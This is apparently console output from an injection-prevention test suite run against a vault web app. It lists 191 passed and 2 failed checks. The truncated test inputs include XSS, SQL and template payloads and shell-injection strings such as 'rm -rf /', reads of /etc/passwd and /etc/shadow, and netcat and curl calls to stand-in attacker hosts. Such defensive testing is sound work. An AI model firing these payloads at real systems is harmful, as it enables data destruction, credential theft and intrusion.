ğŸ§ª Testing Injection Attack Prevention

======================================================================

ğŸ“‹ Setup Phase
----------------------------------------------------------------------
âœ… Register user
Setup Failed: Get CSRF failed 200 {
  'x-powered-by': 'Express',
  'access-control-allow-origin': '*',
  'content-type': 'application/json; charset=utf-8',
  'content-length': '85',
  etag: 'W/"55-0PkgW4UHiEFvW21UXlEp6aFgZ1o"',
  date: 'Thu, 20 Nov 2025 08:52:30 GMT',
  connection: 'keep-alive',
  'keep-alive': 'timeout=5'
}
âŒ Get CSRF token and create vault

ğŸ”´ Test 1: XSS Attack Prevention
----------------------------------------------------------------------
âœ… Sanitize XSS payload in username: <script>alert("XSS")</script>...
âœ… Sanitize XSS payload in vault name: <script>alert("XSS")</script>...
âœ… Sanitize XSS payload in item name: <script>alert("XSS")</script>...
âœ… Sanitize XSS payload in description: <script>alert("XSS")</script>...
âœ… Sanitize XSS payload in username: <img src=x onerror=alert("XSS"...
âœ… Sanitize XSS payload in vault name: <img src=x onerror=alert("XSS"...
âœ… Sanitize XSS payload in item name: <img src=x onerror=alert("XSS"...
âœ… Sanitize XSS payload in description: <img src=x onerror=alert("XSS"...
âœ… Sanitize XSS payload in username: <svg onload=alert("XSS")>...
âœ… Sanitize XSS payload in vault name: <svg onload=alert("XSS")>...
âœ… Sanitize XSS payload in item name: <svg onload=alert("XSS")>...
âœ… Sanitize XSS payload in description: <svg onload=alert("XSS")>...
âœ… Sanitize XSS payload in username: javascript:alert("XSS")...
âœ… Sanitize XSS payload in vault name: javascript:alert("XSS")...
âœ… Sanitize XSS payload in item name: javascript:alert("XSS")...
âœ… Sanitize XSS payload in description: javascript:alert("XSS")...
âœ… Sanitize XSS payload in username: <iframe src="javascript:alert(...
âœ… Sanitize XSS payload in vault name: <iframe src="javascript:alert(...
âœ… Sanitize XSS payload in item name: <iframe src="javascript:alert(...
âœ… Sanitize XSS payload in description: <iframe src="javascript:alert(...
âœ… Sanitize XSS payload in username: <body onload=alert("XSS")>...
âœ… Sanitize XSS payload in vault name: <body onload=alert("XSS")>...
âœ… Sanitize XSS payload in item name: <body onload=alert("XSS")>...
âœ… Sanitize XSS payload in description: <body onload=alert("XSS")>...
âœ… Sanitize XSS payload in username: <input onfocus=alert("XSS") au...
âœ… Sanitize XSS payload in vault name: <input onfocus=alert("XSS") au...
âœ… Sanitize XSS payload in item name: <input onfocus=alert("XSS") au...
âœ… Sanitize XSS payload in description: <input onfocus=alert("XSS") au...
âœ… Sanitize XSS payload in username: <select onfocus=alert("XSS") a...
âœ… Sanitize XSS payload in vault name: <select onfocus=alert("XSS") a...
âœ… Sanitize XSS payload in item name: <select onfocus=alert("XSS") a...
âœ… Sanitize XSS payload in description: <select onfocus=alert("XSS") a...
âœ… Sanitize XSS payload in username: <textarea onfocus=alert("XSS")...
âœ… Sanitize XSS payload in vault name: <textarea onfocus=alert("XSS")...
âœ… Sanitize XSS payload in item name: <textarea onfocus=alert("XSS")...
âœ… Sanitize XSS payload in description: <textarea onfocus=alert("XSS")...
âœ… Sanitize XSS payload in username: <keygen onfocus=alert("XSS") a...
âœ… Sanitize XSS payload in vault name: <keygen onfocus=alert("XSS") a...
âœ… Sanitize XSS payload in item name: <keygen onfocus=alert("XSS") a...
âœ… Sanitize XSS payload in description: <keygen onfocus=alert("XSS") a...
âœ… Sanitize XSS payload in username: <video><source onerror="alert(...
âœ… Sanitize XSS payload in vault name: <video><source onerror="alert(...
âœ… Sanitize XSS payload in item name: <video><source onerror="alert(...
âœ… Sanitize XSS payload in description: <video><source onerror="alert(...
âœ… Sanitize XSS payload in username: <audio src=x onerror=alert("XS...
âœ… Sanitize XSS payload in vault name: <audio src=x onerror=alert("XS...
âœ… Sanitize XSS payload in item name: <audio src=x onerror=alert("XS...
âœ… Sanitize XSS payload in description: <audio src=x onerror=alert("XS...
âœ… Sanitize XSS payload in username: <details open ontoggle=alert("...
âœ… Sanitize XSS payload in vault name: <details open ontoggle=alert("...
âœ… Sanitize XSS payload in item name: <details open ontoggle=alert("...
âœ… Sanitize XSS payload in description: <details open ontoggle=alert("...
âœ… Sanitize XSS payload in username: <marquee onstart=alert("XSS")>...
âœ… Sanitize XSS payload in vault name: <marquee onstart=alert("XSS")>...
âœ… Sanitize XSS payload in item name: <marquee onstart=alert("XSS")>...
âœ… Sanitize XSS payload in description: <marquee onstart=alert("XSS")>...
âœ… Sanitize XSS payload in username: <div onmouseover=alert("XSS")>...
âœ… Sanitize XSS payload in vault name: <div onmouseover=alert("XSS")>...
âœ… Sanitize XSS payload in item name: <div onmouseover=alert("XSS")>...
âœ… Sanitize XSS payload in description: <div onmouseover=alert("XSS")>...
âœ… Sanitize XSS payload in username: "><script>alert("XSS")</script...
âœ… Sanitize XSS payload in vault name: "><script>alert("XSS")</script...
âœ… Sanitize XSS payload in item name: "><script>alert("XSS")</script...
âœ… Sanitize XSS payload in description: "><script>alert("XSS")</script...
âœ… Sanitize XSS payload in username: '><script>alert("XSS")</script...
âœ… Sanitize XSS payload in vault name: '><script>alert("XSS")</script...
âœ… Sanitize XSS payload in item name: '><script>alert("XSS")</script...
âœ… Sanitize XSS payload in description: '><script>alert("XSS")</script...
âœ… Sanitize XSS payload in username: "><img src=x onerror=alert("XS...
âœ… Sanitize XSS payload in vault name: "><img src=x onerror=alert("XS...
âœ… Sanitize XSS payload in item name: "><img src=x onerror=alert("XS...
âœ… Sanitize XSS payload in description: "><img src=x onerror=alert("XS...
âœ… Sanitize XSS payload in username: '><img src=x onerror=alert("XS...
âœ… Sanitize XSS payload in vault name: '><img src=x onerror=alert("XS...
âœ… Sanitize XSS payload in item name: '><img src=x onerror=alert("XS...
âœ… Sanitize XSS payload in description: '><img src=x onerror=alert("XS...
âœ… Sanitize XSS payload in username: <script>document.cookie</scrip...
âœ… Sanitize XSS payload in vault name: <script>document.cookie</scrip...
âœ… Sanitize XSS payload in item name: <script>document.cookie</scrip...
âœ… Sanitize XSS payload in description: <script>document.cookie</scrip...
âœ… Sanitize XSS payload in username: <script>document.location="htt...
âœ… Sanitize XSS payload in vault name: <script>document.location="htt...
âœ… Sanitize XSS payload in item name: <script>document.location="htt...
âœ… Sanitize XSS payload in description: <script>document.location="htt...

ğŸ”´ Test 2: SQL Injection Attack Prevention
----------------------------------------------------------------------
âœ… Sanitize SQL injection in username: '; DROP TABLE users; --...
âœ… Sanitize SQL injection in vault name: '; DROP TABLE users; --...
âœ… Sanitize SQL injection in username: ' OR '1'='1...
âœ… Sanitize SQL injection in vault name: ' OR '1'='1...
âœ… Sanitize SQL injection in username: ' OR 1=1--...
âœ… Sanitize SQL injection in vault name: ' OR 1=1--...
âœ… Sanitize SQL injection in username: ' UNION SELECT * FROM users--...
âœ… Sanitize SQL injection in vault name: ' UNION SELECT * FROM users--...
âœ… Sanitize SQL injection in username: '; DELETE FROM vaults; --...
âœ… Sanitize SQL injection in vault name: '; DELETE FROM vaults; --...
âœ… Sanitize SQL injection in username: ' OR 'a'='a...
âœ… Sanitize SQL injection in vault name: ' OR 'a'='a...
âœ… Sanitize SQL injection in username: admin'--...
âœ… Sanitize SQL injection in vault name: admin'--...
âœ… Sanitize SQL injection in username: admin'/*...
âœ… Sanitize SQL injection in vault name: admin'/*...
âœ… Sanitize SQL injection in username: ' OR 1=1#...
âœ… Sanitize SQL injection in vault name: ' OR 1=1#...
âœ… Sanitize SQL injection in username: ' UNION SELECT NULL--...
âœ… Sanitize SQL injection in vault name: ' UNION SELECT NULL--...
âœ… Sanitize SQL injection in username: 1' AND '1'='1...
âœ… Sanitize SQL injection in vault name: 1' AND '1'='1...
âœ… Sanitize SQL injection in username: 1' AND '1'='2...
âœ… Sanitize SQL injection in vault name: 1' AND '1'='2...
âœ… Sanitize SQL injection in username: 1' OR '1'='1...
âœ… Sanitize SQL injection in vault name: 1' OR '1'='1...
âœ… Sanitize SQL injection in username: 1' OR '1'='2...
âœ… Sanitize SQL injection in vault name: 1' OR '1'='2...
âœ… Sanitize SQL injection in username: 1' OR 1=1--...
âœ… Sanitize SQL injection in vault name: 1' OR 1=1--...
âœ… Sanitize SQL injection in username: 1' OR 1=1#...
âœ… Sanitize SQL injection in vault name: 1' OR 1=1#...
âœ… Sanitize SQL injection in username: 1' OR 1=1/*...
âœ… Sanitize SQL injection in vault name: 1' OR 1=1/*...
âœ… Sanitize SQL injection in username: 1' UNION SELECT NULL--...
âœ… Sanitize SQL injection in vault name: 1' UNION SELECT NULL--...
âœ… Sanitize SQL injection in username: 1' UNION SELECT NULL#...
âœ… Sanitize SQL injection in vault name: 1' UNION SELECT NULL#...
âœ… Sanitize SQL injection in username: 1' UNION SELECT NULL/*...
âœ… Sanitize SQL injection in vault name: 1' UNION SELECT NULL/*...
âœ… Sanitize SQL injection in vault_id parameter
âœ… Sanitize SQL injection in item ID parameter

ğŸ”´ Test 3: Command Injection / RCE Prevention
----------------------------------------------------------------------
âœ… Sanitize command injection in username: ; ls -la...
âœ… Sanitize command injection in vault name: ; ls -la...
âœ… Sanitize command injection in username: | cat /etc/passwd...
âœ… Sanitize command injection in vault name: | cat /etc/passwd...
âœ… Sanitize command injection in username: && whoami...
âœ… Sanitize command injection in vault name: && whoami...
âœ… Sanitize command injection in username: ; rm -rf /...
âœ… Sanitize command injection in vault name: ; rm -rf /...
âœ… Sanitize command injection in username: `whoami`...
âœ… Sanitize command injection in vault name: `whoami`...
âœ… Sanitize command injection in username: $(whoami)...
âœ… Sanitize command injection in vault name: $(whoami)...
âœ… Sanitize command injection in username: ; cat /etc/passwd...
âœ… Sanitize command injection in vault name: ; cat /etc/passwd...
âœ… Sanitize command injection in username: | nc attacker.com 1234...
âœ… Sanitize command injection in vault name: | nc attacker.com 1234...
âœ… Sanitize command injection in username: ; curl http://evil.com...
âœ… Sanitize command injection in vault name: ; curl http://evil.com...
âœ… Sanitize command injection in username: && cat /etc/shadow...
âœ… Sanitize command injection in vault name: && cat /etc/shadow...
âœ… Sanitize command injection in username: ; python -c "import os; os.sys...
âœ… Sanitize command injection in vault name: ; python -c "import os; os.sys...
âœ… Sanitize command injection in username: | node -e "require('child_proc...
âœ… Sanitize command injection in vault name: | node -e "require('child_proc...
âœ… Sanitize command injection in username: ; eval("malicious code")...
âœ… Sanitize command injection in vault name: ; eval("malicious code")...
âœ… Sanitize command injection in username: | exec("malicious code")...
âœ… Sanitize command injection in vault name: | exec("malicious code")...

ğŸ”´ Test 4: Path Traversal Prevention
----------------------------------------------------------------------
âœ… Sanitize path traversal in username: ../../../etc/passwd...
âœ… Sanitize path traversal in vault name: ../../../etc/passwd...
âœ… Sanitize path traversal in username: ..\..\..\windows\system32...
âœ… Sanitize path traversal in vault name: ..\..\..\windows\system32...
âœ… Sanitize path traversal in username: ../../etc/shadow...
âœ… Sanitize path traversal in vault name: ../../etc/shadow...
âœ… Sanitize path traversal in username: ....//....//etc/passwd...
âœ… Sanitize path traversal in vault name: ....//....//etc/passwd...
âœ… Sanitize path traversal in username: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc...
âœ… Sanitize path traversal in vault name: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc...
âœ… Sanitize path traversal in username: ..%2F..%2F..%2Fetc%2Fpasswd...
âœ… Sanitize path traversal in vault name: ..%2F..%2F..%2Fetc%2Fpasswd...
âœ… Sanitize path traversal in username: ..%5c..%5c..%5cwindows%5csyste...
âœ… Sanitize path traversal in vault name: ..%5c..%5c..%5cwindows%5csyste...

ğŸ”´ Test 5: LDAP Injection Prevention
----------------------------------------------------------------------
âœ… Sanitize LDAP injection in username: *)(&...
âœ… Sanitize LDAP injection in username: *))%00...
âœ… Sanitize LDAP injection in username: *()|&...
âœ… Sanitize LDAP injection in username: admin)(&(password=*))...
âœ… Sanitize LDAP injection in username: *)(uid=*))(|(uid=*...

ğŸ”´ Test 6: XML/XXE Injection Prevention
----------------------------------------------------------------------
âœ… Sanitize XML injection in username: <?xml version="1.0"?><!DOCTYPE...
âœ… Sanitize XML injection in username: <?xml version="1.0"?><!DOCTYPE...
âœ… Sanitize XML injection in username: <!DOCTYPE foo [<!ENTITY xxe SY...

ğŸ”´ Test 7: NoSQL Injection Prevention
----------------------------------------------------------------------
âœ… Sanitize NoSQL injection in username: {"$ne": null}...
âœ… Sanitize NoSQL injection in username: {"$gt": ""}...
âœ… Sanitize NoSQL injection in username: {"$regex": ".*"}...
âœ… Sanitize NoSQL injection in username: {"$where": "this.username == t...

ğŸ”´ Test 8: Template Injection Prevention
----------------------------------------------------------------------
âœ… Sanitize template injection in username: {{7*7}}...
âœ… Sanitize template injection in username: ${7*7}...
âœ… Sanitize template injection in username: #{7*7}...
âœ… Sanitize template injection in username: <%= 7*7 %>...
âœ… Sanitize template injection in username: ${jndi:ldap://evil.com/a}...

ğŸ”´ Test 9: Null Byte Injection Prevention
----------------------------------------------------------------------
âœ… Sanitize null byte in username: test ...
âœ… Sanitize null byte in username:  test...
âœ… Sanitize null byte in username: test test...
âœ… Sanitize null byte in username: test%00...
âœ… Sanitize null byte in username: test ...

ğŸ”’ Test 10: Output Encoding Verification
----------------------------------------------------------------------
Test 10 Failed: GET items failed 400 { error: 'Invalid vault_id' }
âŒ Verify stored data is properly encoded in responses

======================================================================

ğŸ“Š Test Results: 191 passed, 2 failed

âš ï¸  Some tests failed. Please review the output above.
âš ï¸  This indicates potential security vulnerabilities.
